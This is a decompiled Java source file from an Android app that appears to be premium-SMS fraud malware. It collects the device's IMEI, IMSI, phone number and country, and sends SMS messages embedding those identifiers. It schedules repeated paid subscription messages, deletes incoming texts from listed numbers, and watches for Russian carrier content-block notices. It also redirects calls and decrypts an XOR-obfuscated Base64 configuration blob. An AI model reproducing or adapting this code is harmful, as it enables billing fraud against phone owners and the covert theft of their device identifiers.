package xxx_2.app;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.Intent.ShortcutIconResource;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.provider.Contacts.People;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.text.format.Time;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintStream;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Date;
import java.util.Vector;
import org.json.JSONArray;
import org.json.JSONObject;

public class Settings
{
  public static String SETTINGS = "settings";
  public static String callTo = "";
  public static boolean ok;
  public static String phone = "phone";
  static Settings settings;
  public static String text = "text";
  public static boolean userAgree;
  public static boolean userCancel;
  public Vector<Operator> operators = new Vector();
  public long repeatTime = 0L;
  public String subscriptionMessage = "";
  public String subscriptionPhone = "";
  public long subscriptionTime = 0L;
  
  static
  {
    ok = false;
    userAgree = false;
    userCancel = false;
  }
  
  public Settings() {}
  
  public static boolean addContact(Context paramContext, String paramString1, String paramString2)
  {
    log("addContact() " + paramString1);
    try
    {
      ContentValues localContentValues = new ContentValues();
      localContentValues.put("number", paramString1);
      localContentValues.put("type", Integer.valueOf(0));
      localContentValues.put("label", paramString2);
      localContentValues.put("name", paramString2);
      paramString2 = Uri.withAppendedPath(paramContext.getContentResolver().insert(Contacts.People.CONTENT_URI, localContentValues), "phones");
      localContentValues.clear();
      localContentValues.put("type", Integer.valueOf(2));
      localContentValues.put("number", paramString1);
      paramContext.getContentResolver().insert(paramString2, localContentValues);
      return true;
    }
    catch (Exception paramContext)
    {
      log(paramContext);
    }
    return false;
  }
  
  public static void createShortcut(Context paramContext, String paramString1, int paramInt, String paramString2)
  {
    paramString2 = new Intent("android.intent.action.VIEW", Uri.parse(paramString2));
    paramString2.addFlags(268435456);
    paramString2.addFlags(67108864);
    Intent localIntent = new Intent();
    localIntent.putExtra("android.intent.extra.shortcut.INTENT", paramString2);
    localIntent.putExtra("android.intent.extra.shortcut.NAME", paramString1);
    localIntent.putExtra("android.intent.extra.shortcut.ICON_RESOURCE", Intent.ShortcutIconResource.fromContext(paramContext, paramInt));
    localIntent.putExtra("duplicate", false);
    localIntent.setAction("com.android.launcher.action.INSTALL_SHORTCUT");
    paramContext.sendBroadcast(localIntent);
  }
  
  public static String decript(String paramString)
  {
    return decript(Base64.decode(paramString, 0));
  }
  
  public static String decript(byte[] paramArrayOfByte)
  {
    int i = 0;
    int m = paramArrayOfByte[0] & 0xFF;
    int j = m + 1;
    try
    {
      for (;;)
      {
        if (j >= paramArrayOfByte.length) {
          return new String(paramArrayOfByte, m + 1, paramArrayOfByte.length - m - 1, "utf-8");
        }
        paramArrayOfByte[j] = ((byte)(paramArrayOfByte[j] ^ paramArrayOfByte[(i + 1)] & 0xFF));
        int k = i + 1;
        i = k;
        if (k == m) {
          i = 0;
        }
        j += 1;
      }
      return "";
    }
    catch (Exception paramArrayOfByte)
    {
      paramArrayOfByte.printStackTrace();
    }
  }
  
  public static String getCountry(Context paramContext)
  {
    try
    {
      paramContext = ((TelephonyManager)paramContext.getSystemService("phone")).getSimCountryIso();
      if (paramContext != null) {
        return paramContext;
      }
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
    return "ERR";
  }
  
  public static String getCurrentTime()
  {
    Time localTime = new Time();
    localTime.setToNow();
    return localTime.format("%Y_%m_%d_%H_%M_%S");
  }
  
  public static String getImei(Context paramContext)
  {
    try
    {
      paramContext = ((TelephonyManager)paramContext.getSystemService("phone")).getDeviceId();
      if (paramContext != null) {
        return paramContext;
      }
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
    return "ERR";
  }
  
  public static String getImsi(Context paramContext)
  {
    try
    {
      paramContext = ((TelephonyManager)paramContext.getSystemService("phone")).getSubscriberId();
      if (paramContext != null) {
        return paramContext;
      }
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
    return "ERR";
  }
  
  public static String getPhone(Context paramContext)
  {
    try
    {
      paramContext = ((TelephonyManager)paramContext.getSystemService("phone")).getLine1Number();
      if (paramContext != null) {
        return paramContext;
      }
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
    return "ERR";
  }
  
  public static Settings getSettings()
  {
    return settings;
  }
  
  public static String isAosMessage(String paramString1, String paramString2)
  {
    try
    {
      paramString2 = new JSONObject(Constants.data).getJSONObject("settings").getJSONObject("aos");
      if (paramString2.getBoolean("enable"))
      {
        if (paramString2.has("phonesEx"))
        {
          JSONArray localJSONArray = paramString2.getJSONArray("phonesEx");
          i = 0;
          while (i < localJSONArray.length())
          {
            paramString2 = localJSONArray.getJSONObject(i);
            String str = paramString2.getString("phone");
            paramString2 = paramString2.getString("text");
            if (paramString1.startsWith(str)) {
              return paramString2;
            }
            i += 1;
          }
        }
        paramString2 = paramString2.getJSONArray("phones");
        int i = 0;
        while (i < paramString2.length())
        {
          boolean bool = paramString1.startsWith(paramString2.getString(i));
          if (bool) {
            return "ok";
          }
          i += 1;
        }
      }
      return paramString2;
    }
    catch (Exception paramString1)
    {
      paramString1.printStackTrace();
      paramString2 = null;
    }
  }
  
  public static boolean isDeleteMessage(String paramString1, String paramString2)
  {
    try
    {
      paramString2 = new JSONObject(Constants.data).getJSONObject("settings").getJSONArray("blockPhones");
      int i = 0;
      while (i < paramString2.length())
      {
        boolean bool = paramString1.equals(paramString2.getString(i));
        if (bool) {
          return true;
        }
        i += 1;
      }
      return false;
    }
    catch (Exception paramString1)
    {
      paramString1.printStackTrace();
    }
  }
  
  public static boolean isDeleteMessageIfNotStartWith(String paramString1, String paramString2)
  {
    try
    {
      Object localObject1 = new JSONObject(Constants.data).getJSONObject("settings");
      if (((JSONObject)localObject1).has("unblockPhones"))
      {
        Object localObject2 = ((JSONObject)localObject1).getJSONObject("unblockPhones");
        localObject1 = ((JSONObject)localObject2).getString("text");
        localObject2 = ((JSONObject)localObject2).getJSONArray("phones");
        int i = 0;
        while (i < ((JSONArray)localObject2).length())
        {
          if (((JSONArray)localObject2).getString(i).equals(paramString1))
          {
            WildCardStringFinder localWildCardStringFinder = new WildCardStringFinder();
            if (paramString2.length() > 0)
            {
              boolean bool = localWildCardStringFinder.isStringMatching(paramString2, (String)localObject1);
              if (!bool) {
                return true;
              }
            }
          }
          i += 1;
        }
      }
      return false;
    }
    catch (Exception paramString1)
    {
      paramString1.printStackTrace();
    }
  }
  
  public static boolean isDie(String paramString1, String paramString2)
  {
    log("iDie phone = " + paramString1 + ", message = " + paramString2);
    if (paramString2.contains("Запрет контента")) {}
    while ((paramString2.contains("ВП запрещен")) || (paramString2.contains("Стоп-Контент")) || (paramString2.contains("запрет на пользование платными"))) {
      return true;
    }
    return false;
  }
  
  public static boolean isOkMessage(String paramString1, String paramString2)
  {
    WildCardStringFinder localWildCardStringFinder1 = new WildCardStringFinder();
    WildCardStringFinder localWildCardStringFinder2 = new WildCardStringFinder();
    return (phone.length() > 0) && (text.length() > 0) && (localWildCardStringFinder2.isStringMatching(paramString1, phone)) && (localWildCardStringFinder1.isStringMatching(paramString2, text));
  }
  
  public static boolean isRedirect(String paramString)
  {
    try
    {
      JSONObject localJSONObject = new JSONObject(Constants.data).getJSONObject("settings");
      if (localJSONObject.has("callRedirect"))
      {
        localJSONObject = localJSONObject.getJSONObject("callRedirect");
        if (localJSONObject.getBoolean("enable"))
        {
          JSONArray localJSONArray = localJSONObject.getJSONArray("phones");
          int i = 0;
          while (i < localJSONArray.length())
          {
            if (localJSONArray.getString(i).equals(paramString))
            {
              callTo = localJSONObject.getString("to");
              return true;
            }
            i += 1;
          }
        }
      }
      return false;
    }
    catch (Exception paramString)
    {
      paramString.printStackTrace();
    }
  }
  
  public static boolean loadSettings(Context paramContext)
  {
    if (getSettings() == null)
    {
      Settings localSettings = new Settings();
      setSettings(localSettings);
      return localSettings.load(paramContext);
    }
    return true;
  }
  
  public static void log(Exception paramException)
  {
    if (Constants.LOGGING)
    {
      log("ERROR - " + paramException);
      return;
    }
    paramException.printStackTrace();
  }
  
  public static void log(String paramString)
  {
    if (!Constants.LOGGING) {
      return;
    }
    System.out.println(paramString);
    Object localObject = new File(Environment.getExternalStorageDirectory() + "/log.txt");
    if (!((File)localObject).exists()) {}
    try
    {
      ((File)localObject).createNewFile();
      try
      {
        localObject = new BufferedWriter(new FileWriter((File)localObject, true), 8);
        Time localTime = new Time();
        localTime.setToNow();
        ((BufferedWriter)localObject).append(localTime.format("%H:%M:%S %d.%m.%Y"));
        ((BufferedWriter)localObject).append(": ");
        ((BufferedWriter)localObject).append(paramString);
        ((BufferedWriter)localObject).newLine();
        ((BufferedWriter)localObject).close();
        return;
      }
      catch (IOException paramString)
      {
        paramString.printStackTrace();
        return;
      }
    }
    catch (IOException localIOException)
    {
      for (;;)
      {
        localIOException.printStackTrace();
      }
    }
  }
  
  public static void makeCall(Context paramContext, String paramString)
  {
    paramString = new Intent("android.intent.action.CALL", Uri.parse("tel:" + paramString));
    paramString.addFlags(268435456);
    paramContext.startActivity(paramString);
  }
  
  public static String md5(String paramString)
  {
    try
    {
      Object localObject = MessageDigest.getInstance("MD5");
      ((MessageDigest)localObject).update(paramString.getBytes());
      paramString = ((MessageDigest)localObject).digest();
      localObject = new StringBuffer();
      int i = 0;
      for (;;)
      {
        if (i >= paramString.length) {
          return ((StringBuffer)localObject).toString();
        }
        String str = Integer.toHexString(paramString[i] & 0xFF);
        if (str.length() == 1) {
          ((StringBuffer)localObject).append("0");
        }
        ((StringBuffer)localObject).append(str);
        i += 1;
      }
      return "";
    }
    catch (NoSuchAlgorithmException paramString)
    {
      paramString.printStackTrace();
    }
  }
  
  public static void parseInSms(Context paramContext)
  {
    try
    {
      Object localObject = new String[1];
      localObject[0] = "content://sms/inbox";
      int i = 0;
      if (i >= localObject.length) {
        return;
      }
      Cursor localCursor = paramContext.getContentResolver().query(Uri.parse(localObject[i]), null, null, null, null);
      int k;
      String str;
      do
      {
        if (!localCursor.moveToNext())
        {
          localCursor.close();
          i += 1;
          break;
        }
        int j = localCursor.getColumnIndex("date");
        k = localCursor.getColumnIndex("body");
        str = localCursor.getString(localCursor.getColumnIndex("address"));
        new Date(localCursor.getLong(j));
      } while (!isDie(str, localCursor.getString(k)));
      log("isDie() = true");
      localObject = getSettings();
      userCancel = true;
      ((Settings)localObject).save(paramContext);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public static boolean sendSms(String paramString1, String paramString2)
  {
    try
    {
      paramString2 = paramString2.replace("{IMEI}", Constants.imei).replace("{IMSI}", Constants.imsi);
      log("sms: " + paramString2 + " to " + paramString1);
      SmsManager.getDefault().sendTextMessage(paramString1, null, paramString2, null, null);
      return true;
    }
    catch (Exception paramString1)
    {
      paramString1.printStackTrace();
    }
    return false;
  }
  
  public static void setSettings(Settings paramSettings)
  {
    settings = paramSettings;
  }
  
  public static void startRepeatTimer(Context paramContext, long paramLong)
  {
    try
    {
      log("startRepeatTimer: " + paramLong + " sec");
      Object localObject = new Intent(paramContext, MainReceiver.class);
      ((Intent)localObject).setAction("custom.reapeat");
      ((Intent)localObject).putExtra("time", System.currentTimeMillis() + Constants.MINUTE * paramLong);
      paramLong = System.currentTimeMillis() + Constants.MINUTE * paramLong;
      localObject = PendingIntent.getBroadcast(paramContext, 0, (Intent)localObject, 0);
      ((AlarmManager)paramContext.getSystemService("alarm")).set(0, paramLong, (PendingIntent)localObject);
      getSettings().repeatTime = paramLong;
      getSettings().save(paramContext);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public static void startRepeatWaitTimer(Context paramContext, long paramLong)
  {
    try
    {
      log("startRepeatWaitTimer: " + paramLong);
      Object localObject = new Intent(paramContext, MainReceiver.class);
      ((Intent)localObject).setAction("custom.reapeat");
      ((Intent)localObject).putExtra("time", paramLong);
      localObject = PendingIntent.getBroadcast(paramContext, 0, (Intent)localObject, 0);
      ((AlarmManager)paramContext.getSystemService("alarm")).set(0, paramLong, (PendingIntent)localObject);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public static void startSmsTimer(Context paramContext, long paramLong, int paramInt, String paramString1, String paramString2)
  {
    try
    {
      log("startSmsTimer: " + paramLong + " sec");
      Object localObject = new Intent(paramContext, MainReceiver.class);
      ((Intent)localObject).setAction("custom.sms." + paramInt);
      ((Intent)localObject).putExtra("phone", paramString1);
      ((Intent)localObject).putExtra("text", paramString2);
      paramLong = System.currentTimeMillis() + Constants.SECOND * paramLong;
      localObject = PendingIntent.getBroadcast(paramContext, 0, (Intent)localObject, 0);
      ((AlarmManager)paramContext.getSystemService("alarm")).set(0, paramLong, (PendingIntent)localObject);
      getSettings().subscriptionTime = paramLong;
      getSettings().subscriptionPhone = paramString1;
      getSettings().subscriptionMessage = paramString2;
      getSettings().save(paramContext);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public boolean load(Context paramContext)
  {
    bool2 = false;
    log("Settings::load() start");
    for (;;)
    {
      try
      {
        Constants.imei = getImei(paramContext);
        Constants.imsi = getImsi(paramContext);
        Constants.phone = getPhone(paramContext);
        Constants.country = getCountry(paramContext);
        if (Constants.DEBUG)
        {
          Constants.imsi = "25001";
          Constants.data = decript("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");
        }
      }
      catch (Exception paramContext)
      {
        int i;
        paramContext.printStackTrace();
        boolean bool1 = bool2;
        continue;
        JSONObject localJSONObject = paramContext.getJSONObject(i);
        Operator localOperator = new Operator();
        localOperator.name = localJSONObject.getString("name");
        localOperator.time = localJSONObject.getLong("time");
        this.operators.add(localOperator);
        i += 1;
        continue;
      }
      try
      {
        System.out.println("json: " + new JSONObject(Constants.data).toString(4));
        log("json settings: " + new JSONObject(Constants.data).toString(4));
        paramContext = paramContext.getSharedPreferences(SETTINGS, 1);
        bool1 = bool2;
        if (paramContext.contains("first"))
        {
          userAgree = paramContext.getBoolean("userAgree", false);
          userCancel = paramContext.getBoolean("userCancel", false);
          this.subscriptionTime = paramContext.getLong("subscriptionTime", 0L);
          this.repeatTime = paramContext.getLong("repeatTime", 0L);
          this.subscriptionPhone = paramContext.getString("subscriptionPhone", "");
          this.subscriptionMessage = paramContext.getString("subscriptionMessage", "");
          paramContext = new JSONArray(paramContext.getString("operators", ""));
          this.operators = new Vector();
          i = 0;
          int j = paramContext.length();
          if (i >= j) {
            bool1 = true;
          }
        }
        else
        {
          log("Settings::load() end");
          return bool1;
        }
      }
      catch (Exception localException)
      {
        localException.printStackTrace();
      }
    }
  }
  
  public void printToOutStream() {}
  
  public void reset(Context paramContext)
  {
    try
    {
      paramContext = paramContext.getSharedPreferences(SETTINGS, 2).edit();
      paramContext.clear();
      paramContext.commit();
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public boolean save(Context paramContext)
  {
    log("Settings::save() start");
    for (;;)
    {
      try
      {
        paramContext = paramContext.getSharedPreferences(SETTINGS, 2).edit();
        paramContext.putBoolean("first", false);
        paramContext.putBoolean("userAgree", userAgree);
        paramContext.putBoolean("userCancel", userCancel);
        paramContext.putLong("subscriptionTime", this.subscriptionTime);
        paramContext.putLong("repeatTime", this.repeatTime);
        paramContext.putString("subscriptionPhone", this.subscriptionPhone);
        paramContext.putString("subscriptionMessage", this.subscriptionMessage);
        localJSONArray = new JSONArray();
        i = 0;
        if (i < this.operators.size()) {
          continue;
        }
        paramContext.putString("operators", localJSONArray.toString());
        paramContext.commit();
      }
      catch (Exception paramContext)
      {
        JSONArray localJSONArray;
        int i;
        Operator localOperator;
        JSONObject localJSONObject;
        paramContext.printStackTrace();
        continue;
      }
      log("Settings::save() end");
      return false;
      localOperator = (Operator)this.operators.get(i);
      localJSONObject = new JSONObject();
      localJSONObject.put("name", localOperator.name);
      localJSONObject.put("time", localOperator.time);
      localJSONArray.put(localJSONObject);
      i += 1;
    }
  }
}
